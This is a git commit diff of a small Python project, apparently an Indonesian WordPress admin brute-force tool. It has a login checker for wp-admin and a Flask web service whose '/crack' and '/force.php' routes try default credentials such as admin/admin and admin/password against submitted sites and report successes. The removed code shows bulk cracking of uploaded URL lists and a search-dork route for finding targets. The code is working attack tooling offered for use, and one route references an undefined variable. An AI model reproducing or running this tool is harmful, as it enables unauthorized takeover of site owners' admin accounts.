5906ffffa610dc66983ace6b2fe4869189bba85c
krypton <52121207+krypton-byte@users.noreply.github.com>
2020-03-16 08:29:57 +0000

    Add files via upload

--- login.py
+++ login.py
@@ -1,7 +1,17 @@
 from bs4 import BeautifulSoup as bs
 import requests
 def __start__(url,username,password):
-	headers={'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0'}
+	headers={
+		'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0',
+		'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+		'Accept-Language':'en-us,en;q=0.5',
+		'Accept-Encoding':'gzip,deflate',
+		'Accept-Charset':'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
+		'Keep-Alive':'300',
+		'Connection':'keep-alive',
+		'Pragma':'no-cache',
+		'Cache-Control':'no-cache'
+		}
 	sesi=requests.Session()
 	requ=sesi.get(url+'/wp-admin',headers=headers)
 	pars=bs(requ.text,'html.parser')
@@ -15,7 +25,9 @@ def __start__(url,username,password):
 		ccc=sesi.post(pars.find_all('form')[0]['action'],data=data_parsing,headers=headers,cookies=requ.cookies).text
 		if '<strong>ERROR</strong>: The password you entered for the username <strong>admin</strong> is incorrect.' in ccc:
 			return False
-		elif 'ERROR' in ccc:
+		elif 'wordpress_logged_in' in ccc.lower():
+			return True
+		elif 'ERROR' in ccc.upper():
 			return False
 		elif 'empty' in ccc:
 			return False
--- web.py
+++ web.py
@@ -1,4 +1,4 @@
-import login
+import login as wp
 from flask import *
 import dork
 import os
@@ -9,32 +9,28 @@ def index():
 @app.route('/crack',methods=['GET','POST'])
 def auto_wp():
 	try:
-		ve=[]
-		if request.files['list_url']:
-			x=request.files['list_url'].read().decode('utf-8').split('\n')
-			x.remove('')
-			for j in x:
-				if login.__start__(j,'admin','pass') == True:
-					ve.append('[sukses] username : %s password : %s result : %s'%('admin','pass',j))
-				elif login.__start__(j,'admin','admin') == True:
-					ve.append('[sukses] username : %s password : %s result : %s'%('admin','admin',j))
-				elif login.__start__(j,'admin','password') == True:
-					ve.append('[sukses] username : %s password : %s result : %s'%('admin','pass',j))
-				else:
-					ve.append(' [gagal!] result : %s'%(j))
-			return str(ve)
+		j=request.form.get('url')
+		if wp.__start__(j,'admin','pass') == True:
+			return '{\'status\':\'sukses\',\'username\':\'%s\',\'password\':\'%s\',\'result\':\'%s\'}'%('admin','pass',j)
+		elif wp.__start__(j,'admin','admin') == True:
+			return '{\'status\':\'sukses\',\'username\':\'%s\',\'password\':\'%s\',\'result\':\'%s\'}'%('admin','admin',j)
+		elif wp.__start__(j,'admin','password') == True:
+			return '{\'status\':\'sukses\',\'username\':\'%s\',\'password\':\'%s\',\'result\':\'%s\'}'%('admin','password',j)
 		else:
-			return 'error'
+			return '{\'status\':\'gagal\',\'result\':\'%s\'}'%(j)
 	except KeyError:
-		return 'list tidak ada'
-@app.route('/dork',methods=['GET','POST'])
-def dork_term():
+		return '{\'status\':\'gagal\',\'pesan\':\'tidak ada data yg di eksekusi\'}'
+@app.route('/force.php',methods=['GET','POST'])
+def login():
 	try:
-		keyword=request.form.get('keyword')
-		waktu=request.form.get('time')
-		page=request.form.get('page')
-		return dork.__start__(keyword,waktu,page)
+		username=request.form.get('username')
+		password=request.form.get('password')
+		url     =request.form.get('url')
+		if wp.__start__(j,username,password) == True :
+			return '{\'status\':\'sukses\',\'username\':\'%s\',\'password\':\'%s\',\'result\':\'%s\'}'%(username,password,j)
+		else:
+			return '{\'status\':\'gagal\',\'username\':\'%s\',\'password\':\'%s\',\'result\':\'%s\'}'%(username,password,j)
 	except:
-		return 'error'
+		return '{\'status\':\'gagal\',\'pesan\':\'tidak ada data yg di eksekusi\'}'
 if __name__ == '__main__':
 	app.run(host='0.0.0.0',port=int(os.environ.get('PORT','5000')),debug=True)
